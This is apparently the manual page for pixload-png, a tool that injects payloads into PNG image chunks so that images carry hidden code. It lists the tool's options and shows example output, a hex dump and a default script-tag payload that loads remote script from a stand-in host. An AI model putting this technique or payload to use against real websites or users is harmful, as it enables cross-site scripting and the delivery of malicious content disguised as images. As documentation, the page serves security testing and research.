=pod

=encoding UTF-8

=head1 NAME

pixload-png - hide payload/malicious code in PNG images

=head1 SYNOPSIS

B<pixload-png> [I<OPTION>]... I<FILE>

=head1 DESCRIPTION

B<pixload-png> creates a PNG Image with payload, or injects payload into existing image.

The payload is injecting into B<IDAT> data chunks.

=head1 OPTIONS

Mandatory arguments to long options are mandatory for short options too.

=over 8

=item B<-W>, B<--pixelwidth> I<INTEGER>

Set pixel width for the new image. Default is 32.

=item B<-H>, B<--pixelheight> I<INTEGER>

Set pixel height for the new image. Default is 32.

=item B<-P>, B<--payload> I<STRING>

Set payload for injection. Default is C<< <script src=//example.com></script> >>.

=item B<-v>, B<--version>

Print version and exit.

=item B<-h>, B<--help>

Print help and exit.

=back

If the output I<FILE> already exists, then B<payload> will be injected into
this existing file. Otherwise, the new one will be created with specified
pixels wide.

=head1 EXAMPLE

  $ pixload-png payload.png
  ..... PNG Payload Creator/Injector .....
  ........................................
  .. https://github.com/sighook/pixload ..
  ........................................

  [>] Injecting payload into payload.png

  [+] Chunk size: 13
  [+] Chunk type: IHDR
  [+] CRC: fc18eda3
  [+] Chunk size: 9
  [+] Chunk type: pHYs
  [+] CRC: 952b0e1b
  [+] Chunk size: 25
  [+] Chunk type: IDAT
  [+] CRC: c8a288fe
  [+] Chunk size: 0
  [+] Chunk type: IEND

  [>] Inject payload to the new chunk: 'pUnk'
  [âœ”] Payload was injected successfully

  payload.png: PNG image data, 32 x 32, 8-bit/color RGB, non-interlaced

  00000000  89 50 4e 47 0d 0a 1a 0a  00 00 00 0d 49 48 44 52  |.PNG........IHDR|
  00000010  00 00 00 20 00 00 00 20  08 02 00 00 00 fc 18 ed  |... ... ........|
  00000020  a3 00 00 00 09 70 48 59  73 00 00 0e c4 00 00 0e  |.....pHYs.......|
  00000030  c4 01 95 2b 0e 1b 00 00  00 19 49 44 41 54 48 89  |...+......IDATH.|
  00000040  ed c1 31 01 00 00 00 c2  a0 f5 4f ed 61 0d a0 00  |..1.......O.a...|
  00000050  00 00 6e 0c 20 00 01 c8  a2 88 fe 00 00 00 00 49  |..n. ..........I|
  00000060  45 4e 44 ae 42 60 82 00  00 00 00 00 00 00 00 00  |END.B`..........|
  00000070  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
  *
  000000c0  00 23 50 55 6e 4b 3c 73  63 72 69 70 74 20 73 72  |.#PUnK<script sr|
  000000d0  63 3d 2f 2f 65 78 61 6d  70 6c 65 2e 63 6f 6d 3e  |c=//example.com>|
  000000e0  3c 2f 73 63 72 69 70 74  3e eb fd 2e 9f 00 49 45  |</script>.....IE|
  000000f0  4e 44                                             |ND|
  000000f2

=head1 SEE ALSO

L<pixload-bmp(1)|https://github.com/sighook/pixload/blob/master/pixload-bmp.1.pod>,
L<pixload-gif(1)|https://github.com/sighook/pixload/blob/master/pixload-gif.1.pod>,
L<pixload-jpg(1)|https://github.com/sighook/pixload/blob/master/pixload-jpg.1.pod>,
L<pixload-webp(1)|https://github.com/sighook/pixload/blob/master/pixload-webp.1.pod>

=cut
